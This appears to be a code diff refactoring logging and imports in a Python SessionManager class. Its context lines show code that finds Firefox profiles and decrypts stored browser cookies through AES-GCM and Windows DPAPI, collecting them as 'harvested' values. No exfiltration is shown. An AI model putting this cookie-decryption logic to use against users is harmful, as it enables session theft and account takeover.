@@ -1,15 +1,12 @@
 import os
 import json
-from monitoring.logger import get_logger
-
-logger = get_logger(__name__)
-
-SESSION_DIR = "data/sessions"
-
-
 import threading
 import sys
 from pathlib import Path
+from monitoring.logger import get_logger
+logger = get_logger(__name__)
+
+SESSION_DIR = "data/sessions"
 
 class SessionManager:
     _local_cookie_cache: dict[str, dict[str, str]] = {}
@@ -92,8 +89,9 @@ class SessionManager:
                         if temp_db.exists():
                             try:
                                 temp_db.unlink()
-                            except Exception:
-                                pass
+                            except Exception as unlink_err:
+                                logger.debug("Failed unlinking temp DB %s: %s", temp_db, unlink_err)
+
         except Exception as err:
             logger.debug("Failed searching Firefox profiles: %s", err)
         return harvested
@@ -143,7 +141,8 @@ class SessionManager:
                     return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
                 else:
                     return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
-            except Exception:
+            except Exception as dec_err:
+                logger.debug("Failed decrypting cookie value: %s", dec_err)
                 return ""
 
         key = get_encryption_key()
@@ -175,8 +174,9 @@ class SessionManager:
                     if temp_db.exists():
                         try:
                             temp_db.unlink()
-                        except Exception:
-                            pass
+                        except Exception as unlink_err:
+                            logger.debug("Failed unlinking temp DB %s: %s", temp_db, unlink_err)
+
         return harvested
 
     @classmethod
